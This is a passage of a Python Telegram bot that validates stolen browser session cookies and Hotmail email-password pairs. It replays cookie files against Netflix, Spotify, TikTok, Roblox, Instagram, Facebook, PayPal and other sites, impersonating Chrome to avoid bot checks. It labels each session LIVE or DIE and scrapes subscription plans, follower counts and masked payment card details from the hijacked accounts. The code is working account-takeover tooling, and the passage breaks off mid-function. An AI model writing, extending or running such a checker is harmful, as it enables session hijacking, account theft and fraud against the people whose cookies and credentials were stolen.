import os
import shutil
import logging
import asyncio
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.error import TimedOut, RetryAfter, BadRequest
from concurrent.futures import ThreadPoolExecutor, as_completed
from ct import OutlookCountryChecker
import requests
import re
from pathlib import Path
import zipfile
from io import BytesIO
import sys
import time, uuid
import random
import string

try:
    from loader import OutlookChecker
except ImportError:
    from hotmail import OutlookChecker


_edit_message_semaphore = asyncio.Semaphore(3) 
_last_edit_time = {}  

async def safe_edit_message_text(query_or_message, text, reply_markup=None, parse_mode=None, max_retries=3):
    chat_id = None
    if hasattr(query_or_message, 'message') and hasattr(query_or_message.message, 'chat_id'):
        chat_id = query_or_message.message.chat_id
    elif hasattr(query_or_message, 'chat_id'):
        chat_id = query_or_message.chat_id
    elif hasattr(query_or_message, 'chat') and hasattr(query_or_message.chat, 'id'):
        chat_id = query_or_message.chat.id
    
    if chat_id:
        current_time = time.time()
        if chat_id in _last_edit_time:
            time_since_last = current_time - _last_edit_time[chat_id]
            if time_since_last < 0.1: 
                await asyncio.sleep(0.1 - time_since_last)
        _last_edit_time[chat_id] = time.time()
    
    async with _edit_message_semaphore:
        for attempt in range(max_retries):
            try:
                if hasattr(query_or_message, 'edit_message_text'):
                    await query_or_message.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                else:
                    await query_or_message.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                return 
            except RetryAfter as e:
                retry_after = int(getattr(e, "retry_after", 5))
                wait_time = retry_after + (attempt * 0.5) 
                logger.warning(f"Rate limited (429). Waiting {wait_time}s before retry {attempt + 1}/{max_retries}")
                await asyncio.sleep(wait_time)
                if attempt == max_retries - 1:
                    logger.error(f"Failed to edit message after {max_retries} retries due to rate limiting")
                    return 
            except BadRequest as e:
                if "message is not modified" in str(e).lower():
                    return  
                elif "message to edit not found" in str(e).lower():
                    logger.warning("Message to edit not found, skipping")
                    return
                else:
                    logger.error(f"BadRequest when editing message: {e}")
                    raise  
            except TimedOut:
                wait_time = (attempt + 1) * 1.0 
                logger.warning(f"Timeout when editing message. Retrying in {wait_time}s ({attempt + 1}/{max_retries})")
                await asyncio.sleep(wait_time)
                if attempt == max_retries - 1:
                    logger.error(f"Failed to edit message after {max_retries} retries due to timeout")
                    return
            except Exception as e:
                logger.error(f"Unexpected error when editing message (attempt {attempt + 1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(0.5 * (attempt + 1)) 
                else:
                    pass
                return 

def get_hotmail_country(email, password):
    try:
        checker = OutlookCountryChecker()
        result = checker.check_account(email, password)
    except Exception:
        return "N/A"
    if "✅ SUCCESS" not in result:
        return "N/A"
    marker = "🌍 "
    idx = result.find(marker)
    if idx == -1:
        return "N/A"
    start = idx + len(marker)
    end = result.find("|", start)
    if end == -1:
        country_part = result[start:].strip()
    else:
        country_part = result[start:end].strip()
    if country_part.lower().startswith("country:"):
        parts = country_part.split(":", 1)
        if len(parts) == 2:
            country_part = parts[1].strip()
    if not country_part:
        return "N/A"
    return country_part

def _split_cookie_path(file_path):
    p = Path(file_path)
    return p.parent.name, p.name

def _fast_print(msg):
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    print(msg, flush=True)

try:
    from curl_cffi import requests as crequests
    HAS_CURL_CFFI = True
except ImportError:
    _fast_print("WARNING: curl_cffi not installed. Installing via pip.")
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "curl_cffi"])
        from curl_cffi import requests as crequests
        HAS_CURL_CFFI = True
        _fast_print("SUCCESS: curl_cffi installed successfully")
    except Exception as e:
        _fast_print(f"ERROR: Failed to install curl_cffi: {e}")
        crequests = requests
        HAS_CURL_CFFI = False

CUSTOM_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

def parse_cookies_txt(content):
    cookies = []
    lines = content.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        elif line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) < 7:
            continue
        domain, subd_flag, path, secure_flag, expires, name, value = parts[:7]
        if " " in domain:
            domain = domain.split()[-1]
        cookies.append({
            'domain': domain,
            'path': path,
            'secure': secure_flag.upper() == 'TRUE',
            'expires': expires,
            'name': name,
            'value': value
        })
    return cookies

def filter_cookies_by_domain(cookies, target_domains):
    filtered = []
    for cookie in cookies:
        for target_domain in target_domains:
            if cookie['domain'] == target_domain or cookie['domain'].endswith(target_domain):
                filtered.append(cookie)
                break
    return filtered

def filter_cookie_text_by_service(content: str, service_name: str) -> str:
    if service_name not in SCAN_TARGETS:
        return content
    domains = SCAN_TARGETS[service_name]['domains']
    filtered_lines = []
    
    # Preserve typical Netscape Cookie metadata header lines
    for line in content.splitlines():
        if line.startswith('#'):
            filtered_lines.append(line)
            continue
            
        parts = line.strip().split('\t')
        if len(parts) >= 6:
            domain = parts[0]
            if " " in domain:
                domain = domain.split()[-1]
            if any(domain == d or domain.endswith(d) for d in domains):
                filtered_lines.append(line)
    
    if not filtered_lines:
        return ""
    return '\n'.join(filtered_lines) + '\n'

def get_status_icon(status):
    if status == 'success':
        return "🍪"
    elif status == 'dead':
        return "🍪"
    else:
        return ""

def get_status_text(status):
    if status == 'success':
        return "LIVE"
    elif status in ('dead', 'no_cookies', 'unknown'):
        return "DIE"
    elif status == 'error':
        return "ERROR"
    else:
        return "DIE"

def clean_filename(name):
    name = name.replace("/", "_").replace("\\", "_")
    name = re.sub(r"\s+", "_", name)
    return name[:50]

def extract_public_plan_info(plan_info):
    """Plan info is intentionally hidden from public output."""
    return ""

def test_cookies_with_target(cookies, target_url, contains_text):
    try:
        if HAS_CURL_CFFI:
            session = crequests.Session(impersonate="chrome")
        else:
            session = requests.Session()

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            session.cookies.set(cookie_name, cookie_value, domain=domain, path=cookie['path'], secure=cookie['secure'])

        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        if 'roblox.com' in target_url:
            return test_roblox_login(cookies)
        if 'instagram.com' in target_url:
            return test_instagram_login(cookies)
        if 'youtube.com' in target_url:
            return test_youtube_login(cookies)
        if 'linkedin.com' in target_url:
            return test_linkedin_login(cookies)
        if 'amazon.com' in target_url:
            return test_amazon_login(cookies)
        if 'wordpress.com' in target_url:
            return test_wordpress_login(cookies)
        if 'capcut.com' in target_url:
            return test_capcut_login(cookies)

        session.headers.update(headers)
        response = session.get(target_url, timeout=20, allow_redirects=True)
        final_url = response.url
        status_code = response.status_code
        text = response.text

        if status_code == 200 and contains_text.lower() in text.lower():
            plan_info = ""
            if "netflix.com" in target_url:
                plan_info = extract_netflix_plan(text)
            if "canva.com" in target_url:
                plan_info = extract_canva_plan(text)
            return {
                'status': 'success',
                'message': 'Cookie LIVE',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': plan_info
            }
        else:
            if "login" in final_url.lower() or "signin" in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirect to login',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD'
                }
            return {
                'status': 'dead',
                'message': 'Cookie DEAD or no access to target',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD'
            }
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing cookies: {str(e)}',
            'final_url': None,
            'status_code': None,
            'plan_info': 'Status: Error'
        }

def extract_netflix_plan(html_content):
    try:
        exact_plan_patterns = [
            r'<h3[^>]*data-uia="account-membership-page\+plan-card\+title"[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<h3[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        membership_div_patterns = [
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*e1devdx33[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        for pattern in membership_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def extract_tiktok_username(html_content):
    try:
        pattern = r'"uniqueId":"([^"]+)"'
        matches = re.findall(pattern, html_content)
        if matches:
            return matches[0]
        pattern_h1 = r'<h1[^>]*>([^<]+)</h1>'
        match_h1 = re.search(pattern_h1, html_content)
        if match_h1:
            username = match_h1.group(1).strip()
            if username and len(username) < 50:
                return username
        return "Unknown"
    except Exception as e:
        return "Unknown"

def extract_payment_info(html_content):
    try:
        masked_card_patterns = [
            r'(\b(?:\d{4}\s*[-•*·]{1,3}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s+){3}\d{4}\b)',
            r'((?:Card|Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)[^<]{0,30}\d{2,4}[-•*·]{2,10}\d{2,4})',
            r'(\d{4}\s*[•*·]{2,10}\s*\d{4})',
            r'(\b(?:\d{4}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s*[-•*·]{1,3}\s*){3}\d{4}\b)',
            r'(\b(?:\d{4}\s+){3}\d{4}\b)',
            r'((?:Card|Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)\s*[•*·]{0,10}\s*\d{4})',
            r'(\d+(?:&nbsp;|\s)+[A-Z]{2,4}\$[^<]{0,15})',
            r'(\d+(?:&nbsp;|\s)*[^<]{0,10}/(?:month|year|tháng|n?m|mese|año)[^<]{0,10})',
        ]

        all_payment_info = []

        for pattern in masked_card_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                payment_info = match.strip()

                payment_info = payment_info.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')

                if payment_info and len(payment_info) > 2:
                    is_duplicate = False
                    for existing in all_payment_info:
                        if payment_info in existing or existing in payment_info:
                            if len(payment_info) > len(existing):
                                all_payment_info.remove(existing)
                                all_payment_info.append(payment_info)
                            is_duplicate = True
                            break
                    if not is_duplicate:
                        all_payment_info.append(payment_info)

        if all_payment_info:
            return f" | {' · '.join(all_payment_info)}"

        return ""

    except Exception as e:
        return ""

def extract_canva_plan(html_content):
    try:
        plan_patterns = [
            r'Canva\s+Pro',
            r'Canva\s+Teams?',
            r'Canva\s+Business',
            r'Canva\s+Enterprise',
            r'Canva\s+┌──i\s+nhóm',
            r'Canva\s+Doanh\s+nghi?p',
            r'Canva\s+Gratis',
            r'Canva\s+Free',
            r'Canva\s+Mi?n\s+phí',
        ]
        for pattern in plan_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return f"Plan: {match.group(0)}"
        generic_patterns = [
            r'Plan:\s*([A-Za-z0-9 \-\(\)]+)',
            r'Subscription:\s*([A-Za-z0-9 \-\(\)]+)'
        ]
        for pattern in generic_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                return f"Plan: {match.group(1).strip()}"
        return "Plan: Unknown"
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def test_cookies_with_target(cookies, target_url, contains_text):
    #make by @m3l0d1x
    if not cookies:
        return {
            'status': 'no_cookies',
            'message': 'Không có cookies phù hợp cho domain này'
        }
    
    if 'roblox.com' in target_url.lower():
        return test_roblox_login(cookies)
    
    
    if 'instagram.com' in target_url.lower():
        return test_instagram_login(cookies)
    
    if 'youtube.com' in target_url.lower():
        return test_youtube_login(cookies)
    
    if 'linkedin.com' in target_url.lower():
        return test_linkedin_login(cookies)
    
    if 'amazon.com' in target_url.lower():
        return test_amazon_login(cookies)
    
    if 'wordpress.com' in target_url.lower():
        return test_wordpress_login(cookies)

    if 'capcut.com' in target_url.lower():
        return test_capcut_login(cookies)

    if 'paypal.com' in target_url.lower():
        return test_paypal_login(cookies)

    if 'facebook.com' in target_url.lower():

        required_cookies = ['c_user', 'xs', 'datr', 'fr', 'sb']
        cookie_names = [cookie['name'] for cookie in cookies]
        missing_cookies = [cookie for cookie in required_cookies if cookie not in cookie_names]
        
        if missing_cookies:

            return {
                'status': 'no_cookies',
                'message': f'Không đủ cookies Facebook (thiếu: {", ".join(missing_cookies)})',
                'final_url': target_url,
                'status_code': 200
            }
        else:

            return test_facebook_login(cookies)
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')

            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Encoding': 'gzip, deflate, br'
        }
        
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=True)
        
        if len(response.content) > 50 * 1024 * 1024:
            return {
                'status': 'error',
                'message': 'Response too large, skipping analysis',
                'final_url': response.url,
                'status_code': response.status_code
            }
        final_url = response.url
        status_code = response.status_code
        
        if 'login' in final_url.lower() or 'signin' in final_url.lower() or 'accounts.' in final_url.lower():
            return {
                'status': 'dead',
                'message': 'Cookie DEAD',
                'final_url': final_url,
                'status_code': status_code
            }
        
        if status_code == 200:
            if 'login' in final_url.lower() or 'signin' in final_url.lower() or 'accounts.' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD',
                    'final_url': final_url,
                    'status_code': status_code
                }
            
            elif contains_text and contains_text.lower() in response.text.lower():
                if 'tiktok.com' in target_url.lower():
                   
                    if 'tiktok.com/setting' in final_url.lower():
                       
                        username = extract_tiktok_username(response.text)
                        if username:
                            
                            profile_result = test_tiktok_profile(cookies, username)
                            if profile_result['status'] == 'success':
                                stats = profile_result['stats']
                                followers = stats['followers']
                                following = stats['following']
                                likes = stats['likes']
                                videos = stats.get('videos', '0')
                                verified = stats.get('verified', 'false')
                                
                               
                                plan_info = f"User: {username} | Followers: {followers} | Following: {following} | Likes: {likes} | Videos: {videos}"
                                if verified == 'true':
                                    plan_info += " | Verified"
                            else:
                                plan_info = f"User: {username} | Profile: {profile_result['message']}"
                        else:
                            plan_info = 'Status: LIVE - On setting page'
                        
                        return {
                            'status': 'success',
                            'message': 'Cookie LIVE - Access to setting page',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                    else:
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Redirected from setting',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': 'Status: DEAD - Cannot access setting'
                        }
                elif 'canva.com' in target_url.lower():
                    
                    canva_result = test_canva_login(cookies)
                    return canva_result
                
               
                plan_info = ""
                if 'spotify.com' in target_url.lower():
                    plan_info = extract_spotify_plan(response.text)
                elif 'netflix.com' in target_url.lower():
                    plan_info = extract_netflix_plan(response.text)
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Login successfully!',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            elif 'account' in final_url.lower() or 'overview' in final_url.lower() or 'membership' in final_url.lower() or 'billing' in final_url.lower():
                
                if 'canva.com' in target_url.lower():
                    canva_result = test_canva_login(cookies)
                    return canva_result
                
               
                plan_info = ""
                if 'spotify.com' in target_url.lower():
                    plan_info = extract_spotify_plan(response.text)
                elif 'netflix.com' in target_url.lower():
                    plan_info = extract_netflix_plan(response.text)
                
                if 'netflix.com' in target_url.lower():
                    
                    if 'account' in final_url.lower() and 'membership' not in final_url.lower():
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Not complete account',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                    
                    elif "Unknown" in plan_info or "Not found" in plan_info:
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Not complete account or no plan',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            else:
                if 'tiktok.com' in target_url.lower():
                   
                    if 'tiktok.com/setting' in final_url.lower():
                       
                        username = extract_tiktok_username(response.text)
                        if username:
                           
                            profile_result = test_tiktok_profile(cookies, username)
                            if profile_result['status'] == 'success':
                                stats = profile_result['stats']
                                followers = stats['followers']
                                following = stats['following']
                                likes = stats['likes']
                                videos = stats.get('videos', '0')
                                verified = stats.get('verified', 'false')
                                
                               
                                plan_info = f"User: {username} | Followers: {followers} | Following: {following} | Likes: {likes} | Videos: {videos}"
                                if verified == 'true':
                                    plan_info += " | Verified"
                            else:
                                plan_info = f"User: {username} | Profile: {profile_result['message']}"
                        else:
                            plan_info = 'Status: LIVE - On setting page'
                        
                        return {
                            'status': 'success',
                            'message': 'Cookie LIVE - Access to setting page',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': plan_info
                        }
                    else:
                        return {
                            'status': 'dead',
                            'message': 'Cookie DEAD - Redirected from setting',
                            'final_url': final_url,
                            'status_code': status_code,
                            'plan_info': 'Status: DEAD - Cannot access setting'
                        }
                elif 'facebook.com' in target_url.lower():
                   
                    facebook_result = test_facebook_login(cookies)
                    return facebook_result
                elif 'canva.com' in target_url.lower():
                   
                    canva_result = test_canva_login(cookies)
                    return canva_result
                else:
                    return {
                        'status': 'unknown',
                        'message': 'Cookie UNKNOWN - Unknown status',
                        'final_url': final_url,
                        'status_code': status_code
                    }
        else:
            if 'canva.com' in target_url.lower():
               
                canva_result = test_canva_login(cookies)
                return canva_result
            else:
                return {
                    'status': 'dead',
                    'message': f'Cookie DEAD - HTTP {status_code}',
                    'final_url': final_url,
                    'status_code': status_code
                }
            
    except Exception as e:
        #make by @m3l0d1x
        return {
            'status': 'error',
            'message': f'Error testing cookies: {str(e)}'
        }

def extract_spotify_plan(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        exact_plan_patterns = [
            r'<div[^>]*class="sc-15a2717d-5 gNnrac"[^>]*>.*?<span[^>]*class="[^"]*encore-text-title-medium[^"]*"[^>]*>([^<]+)</span>',
            r'<span[^>]*class="[^"]*encore-text-title-medium[^"]*"[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*gNnrac[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>'
        ]
        
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        subscription_div_patterns = [
            r'<div[^>]*class="[^"]*sc-15a2717d-5[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*gNnrac[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*dbRLzW[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>'
        ]
        
        for pattern in subscription_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        return "Plan: Unknown - Not found plan in subscription page"
        
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def test_netflix_login(cookies):
    #make by @m3l0d1x
    return test_cookies_with_target(cookies, "https://www.netflix.com/browse", "profiles")

def test_spotify_login(cookies):
    #make by @m3l0d1x
    return test_cookies_with_target(cookies, "https://www.spotify.com/account/overview/", "account")

def test_tiktok_login(cookies):
    #make by @m3l0d1x
    return test_cookies_with_target(cookies, "https://www.tiktok.com/setting", "setting")

def test_roblox_login(cookies):
    #make by @m3l0d1x
    try:
        session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Referer': 'https://www.roblox.com/'
        }
        
        target_url = "https://www.roblox.com/vi/home"
        response = session.get(target_url, headers=headers, timeout=30, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        
        if status_code == 200:
            if '/vi/home' in final_url:
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Logged into Roblox home page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: LIVE - On Roblox home page'
                }
            elif '/login' in final_url.lower() or '/vi/login' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to Roblox login page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Redirected to login'
                }
            else:
                return {
                    'status': 'unknown',
                    'message': f'Cookie UNKNOWN - Unexpected redirect to {final_url}',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: UNKNOWN - Unexpected redirect'
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code}'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Roblox: {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def test_instagram_login(cookies):
   
    try:
        
        session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.instagram.com/',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        target_url = "https://www.instagram.com/accounts/edit/"
        response = session.get(target_url, headers=headers, timeout=30, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        
        if status_code == 200:
            if '/accounts/edit/' in final_url:
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to Instagram edit page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: LIVE - On Instagram edit page'
                }
            elif '/accounts/login' in final_url.lower() or '/login' in final_url.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to Instagram login page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Redirected to login'
                }
            else:
                return {
                    'status': 'unknown',
                    'message': f'Cookie UNKNOWN - Unexpected redirect to {final_url}',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: UNKNOWN - Unexpected redirect'
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code}'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Instagram: {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def extract_netflix_plan(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        exact_plan_patterns = [
            r'<h3[^>]*data-uia="account-membership-page\+plan-card\+title"[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<h3[^>]*class="[^"]*"[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        
        for pattern in exact_plan_patterns:
            exact_match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if exact_match:
                plan_name = exact_match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        membership_div_patterns = [
            r'<div[^>]*class="[^"]*default-ltr-cache-1rvukw7[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>',
            r'<div[^>]*class="[^"]*e1devdx33[^"]*"[^>]*>.*?<h3[^>]*>([^<]+)</h3>'
        ]
        
        for pattern in membership_div_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match:
                plan_name = match.group(1).strip()
                if len(plan_name) < 50 and not re.search(r'\d', plan_name):
                    return f"Plan: {plan_name}"
        
        return "Plan: Unknown - Not found plan in membership page"
        
    except Exception as e:
        return f"Plan: Error when checking - {str(e)}"

def extract_tiktok_plan(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        
        tiktok_indicators = [
            r'<div[^>]*class="[^"]*css-1tgbgko-5e6d46e3--DivLayoutNav[^"]*"[^>]*>',
            r'<div[^>]*class="[^"]*css-1hecd5w-5e6d46e3--DivNavScrollContainer[^"]*"[^>]*>',
            r'<div[^>]*data-e2e="nav-[^"]*"[^>]*role="tab"',
            r'<div[^>]*data-index="[^"]*"[^>]*role="tab"',
            
            r'data-e2e="nav-manage-account"',
            r'data-e2e="nav-privacy"',
            r'data-e2e="nav-push"',
            r'data-e2e="nav-business-account"',
            r'data-e2e="nav-ads"',
            r'data-e2e="nav-stm"',
            r'data-e2e="nav-keyword-filtering"',
            
            r'class="[^"]*css-1tgbgko-5e6d46e3--DivLayoutNav[^"]*"',
            r'class="[^"]*css-1hecd5w-5e6d46e3--DivNavScrollContainer[^"]*"',
            r'class="[^"]*css-y1al60-5e6d46e3--DivNavItem[^"]*"',
            r'class="[^"]*css-1cja238-5e6d46e3--SpanIconContainer[^"]*"',
            r'class="[^"]*css-1434rp1-5e6d46e3--SpanItemContent[^"]*"',
            r'class="[^"]*css-1boizxf-5e6d46e3--SpanItemContent[^"]*"',
            r'class="[^"]*css-2dl94e-5e6d46e3--SpanIconContainer[^"]*"',
            
            r'<svg[^>]*viewBox="0 0 48 48"[^>]*>.*?</svg>',
            r'<svg[^>]*viewBox="0 0 20 20"[^>]*>.*?</svg>',
            r'<path[^>]*fill-rule="evenodd"[^>]*>.*?</path>',
            
            r'aria-label="[^"]*"[^>]*role="tab"',
            r'aria-label="Manage account"',
            r'aria-label="Privacy"',
            r'aria-label="Push notifications"',
            r'aria-label="Business Account"',
            r'aria-label="Ads"',
            r'aria-label="Screen time"',
            r'aria-label="Content preferences"',
            
            r'href="/setting\?lang=[^"]*"',
            r'href="/setting"',
        ]
        
        tiktok_indicators_found = 0
        for pattern in tiktok_indicators:
            if re.search(pattern, html_content, re.IGNORECASE | re.DOTALL):
                tiktok_indicators_found += 1
        
        if tiktok_indicators_found >= 3:
            return "Status: Logged In"
        
        username_patterns = [
            r'<span[^>]*class="[^"]*username[^"]*"[^>]*>([^<]+)</span>',
            r'<div[^>]*class="[^"]*nickname[^"]*"[^>]*>([^<]+)</div>'
        ]
        
        for pattern in username_patterns:
            match = re.search(pattern, html_content, re.DOTALL | re.IGNORECASE)
            if match and len(match.groups()) > 0:
                username = match.group(1).strip()
                if username and len(username) < 50:
                    return f"User: {username}"
        
        return "Status: Unknown - Not found login info"
        
    except Exception as e:
        return f"Status: Error when checking - {str(e)}"

def extract_tiktok_username(html_content):
    #make by @m3l0d1x
    try:
        import re
        
        pattern = r'"uniqueId":"([^"]+)"'
        matches = re.findall(pattern, html_content)
        
        if matches:
            unique_usernames = list(set(matches))
            if unique_usernames:
                return unique_usernames[0]
        
        return None
        
    except Exception as e:
        return None

def extract_tiktok_profile_stats(html_content):
    
    try:
        import re
        
        
        patterns = {
            'followers': r'"followerCount":(\d+)',
            'following': r'"followingCount":(\d+)', 
            'likes': r'"heartCount":(\d+)',
            'videos': r'"videoCount":(\d+)',
            'verified': r'"verified":(true|false)',
        }
        
        
        stats = {}
        for key, pattern in patterns.items():
            match = re.search(pattern, html_content)
            stats[key] = match.group(1) if match else "0"
        
        return {
            'followers': stats['followers'],
            'following': stats['following'],
            'likes': stats['likes'],
            'videos': stats.get('videos', '0'),
            'verified': stats.get('verified', 'false')
        }
        
    except Exception as e:
        return {
            'followers': '0',
            'following': '0',
            'likes': '0',
            'videos': '0',
            'verified': 'false'
        }

def test_tiktok_profile(cookies, username):
    try:
        import requests
        
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            
            cookie_name = str(cookie['name'])[:100]           
            cookie_value = str(cookie['value'])[:4000]             
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT
        }
        
        
        profile_url = f"https://www.tiktok.com/@{username}"
